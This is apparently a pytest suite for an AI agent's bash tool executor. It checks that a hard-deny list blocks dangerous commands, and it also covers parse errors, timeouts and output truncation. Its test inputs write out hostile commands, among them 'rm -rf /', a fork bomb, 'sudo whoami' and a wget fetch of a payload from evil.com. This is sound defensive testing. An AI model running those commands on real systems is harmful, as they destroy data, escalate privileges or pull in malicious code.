"""Tests for the primitive ``bash`` tool executor.

FRE-261 Step 4.
"""

from __future__ import annotations

import asyncio
from pathlib import Path
from tempfile import TemporaryDirectory
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from personal_agent.tools.primitives.bash import (
    _FALLBACK_DENY,
    _is_hard_denied,
    _load_deny_patterns,
    bash_executor,
    bash_tool,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_mock_proc(
    exit_code: int = 0,
    stdout: bytes = b"",
    stderr: bytes = b"",
    timeout: bool = False,
) -> MagicMock:
    """Build a mock asyncio.Process that returns fixed output."""
    proc = MagicMock()
    proc.returncode = exit_code
    proc.kill = MagicMock()
    proc.wait = AsyncMock()
    if timeout:
        proc.communicate = AsyncMock(side_effect=asyncio.TimeoutError())
    else:
        proc.communicate = AsyncMock(return_value=(stdout, stderr))
    return proc


# ---------------------------------------------------------------------------
# Hard-deny tests — no subprocess should be spawned
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_hard_deny_rm_rf() -> None:
    """'rm -rf /' must be hard-denied before subprocess creation."""
    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec"
    ) as mock_exec:
        result = await bash_executor("rm -rf /")

    mock_exec.assert_not_called()
    assert result["success"] is False
    assert result["error"] == "hard_denied"


@pytest.mark.asyncio
async def test_hard_deny_sudo() -> None:
    """'sudo whoami' must be hard-denied."""
    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec"
    ) as mock_exec:
        result = await bash_executor("sudo whoami")

    mock_exec.assert_not_called()
    assert result["success"] is False
    assert result["error"] == "hard_denied"


@pytest.mark.asyncio
async def test_hard_deny_fork_bomb() -> None:
    """Fork bomb pattern must be hard-denied."""
    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec"
    ) as mock_exec:
        result = await bash_executor(":(){ :|:& };:")

    mock_exec.assert_not_called()
    assert result["success"] is False
    assert result["error"] == "hard_denied"


@pytest.mark.asyncio
async def test_hard_deny_wget() -> None:
    """wget must be hard-denied."""
    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec"
    ) as mock_exec:
        result = await bash_executor("wget http://evil.com/payload.sh")

    mock_exec.assert_not_called()
    assert result["success"] is False
    assert result["error"] == "hard_denied"


# ---------------------------------------------------------------------------
# Parse error
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_shlex_error() -> None:
    """Unclosed quote must return parse_error without spawning subprocess."""
    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec"
    ) as mock_exec:
        result = await bash_executor("echo 'unclosed")

    mock_exec.assert_not_called()
    assert result["success"] is False
    assert result["error"] == "parse_error"
    assert "detail" in result


# ---------------------------------------------------------------------------
# Happy path
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_happy_path() -> None:
    """A command returning exit_code=0 with stdout produces success=True."""
    mock_proc = _make_mock_proc(exit_code=0, stdout=b"hello\n", stderr=b"")

    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec",
        new=AsyncMock(return_value=mock_proc),
    ):
        result = await bash_executor("echo hello")

    assert result["success"] is True
    assert result["exit_code"] == 0
    assert result["stdout"] == "hello\n"
    assert result["stderr"] == ""
    assert result["truncated_path"] is None


# ---------------------------------------------------------------------------
# Timeout
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_timeout() -> None:
    """asyncio.TimeoutError from communicate() must surface as error='timeout'."""
    mock_proc = _make_mock_proc(timeout=True)

    with patch(
        "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec",
        new=AsyncMock(return_value=mock_proc),
    ):
        result = await bash_executor("sleep 999", timeout_seconds=1)

    assert result["success"] is False
    assert result["error"] == "timeout"
    assert "timeout_seconds" in result
    # kill() must have been called
    mock_proc.kill.assert_called_once()


# ---------------------------------------------------------------------------
# Output cap / truncation
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_output_cap_truncates() -> None:
    """Output > 50 KiB is truncated and truncated_path is set when ctx has trace_id."""
    # Generate 60 KiB of output (well above 50 KiB cap)
    big_output = b"x" * 61_440
    mock_proc = _make_mock_proc(exit_code=0, stdout=big_output, stderr=b"")

    from personal_agent.telemetry import TraceContext

    ctx = TraceContext(trace_id="test-trace-overflow")

    with TemporaryDirectory() as tmpdir:
        scratch_root = Path(tmpdir) / "agent_scratch"

        with (
            patch(
                "personal_agent.tools.primitives.bash.asyncio.create_subprocess_exec",
                new=AsyncMock(return_value=mock_proc),
            ),
            patch(
                "personal_agent.tools.primitives.bash.Path",
                side_effect=lambda *args: Path(*args),
            ),
        ):
            # Patch the scratch directory to use our tmpdir
            import personal_agent.tools.primitives.bash as bash_mod

            original_path = bash_mod.Path

            def patched_path(*args: Any) -> Path:
                if args and args[0] == "/tmp/agent_scratch":
                    return scratch_root
                return original_path(*args)

            with patch.object(bash_mod, "Path", side_effect=patched_path):
                result = await bash_executor("cat bigfile", ctx=ctx)

    assert result["success"] is True
    assert result["truncated_path"] is not None
    # In-memory stdout should be capped (25 KiB = 25600 chars)
    assert len(result["stdout"]) <= 25_600 + 1  # +1 for safety


# ---------------------------------------------------------------------------
# Forbidden modes
# ---------------------------------------------------------------------------


def test_forbidden_mode() -> None:
    """bash_tool.allowed_modes must not include LOCKDOWN or RECOVERY."""
    assert "LOCKDOWN" not in bash_tool.allowed_modes
    assert "RECOVERY" not in bash_tool.allowed_modes


# ---------------------------------------------------------------------------
# Deny patterns loaded from governance config
# ---------------------------------------------------------------------------


def test_hard_deny_patterns_from_governance_config() -> None:
    """_load_deny_patterns uses governance config when available."""
    from personal_agent.governance.models import GovernanceConfig, ToolPolicy

    policy = ToolPolicy(
        category="system_dangerous",
        allowed_in_modes=["NORMAL"],
        hard_deny_patterns=["custom_deny_pattern"],
    )
    mock_config = MagicMock(spec=GovernanceConfig)
    mock_config.tools = {"bash": policy}

    with patch(
        "personal_agent.tools.primitives.bash.load_governance_config",
        return_value=mock_config,
    ):
        patterns = _load_deny_patterns()

    assert "custom_deny_pattern" in patterns


def test_hard_deny_patterns_fallback_when_governance_fails() -> None:
    """_load_deny_patterns falls back to _FALLBACK_DENY when config load fails."""
    with patch(
        "personal_agent.tools.primitives.bash.load_governance_config",
        side_effect=Exception("config unavailable"),
    ):
        patterns = _load_deny_patterns()

    assert patterns == _FALLBACK_DENY


# ---------------------------------------------------------------------------
# _is_hard_denied unit tests
# ---------------------------------------------------------------------------


def test_is_hard_denied_matches_rm_rf() -> None:
    assert _is_hard_denied("rm -rf /", _FALLBACK_DENY) is not None


def test_is_hard_denied_no_match_for_safe_command() -> None:
    assert _is_hard_denied("ls -la /tmp", _FALLBACK_DENY) is None


def test_is_hard_denied_case_insensitive() -> None:
    assert _is_hard_denied("SUDO whoami", _FALLBACK_DENY) is not None
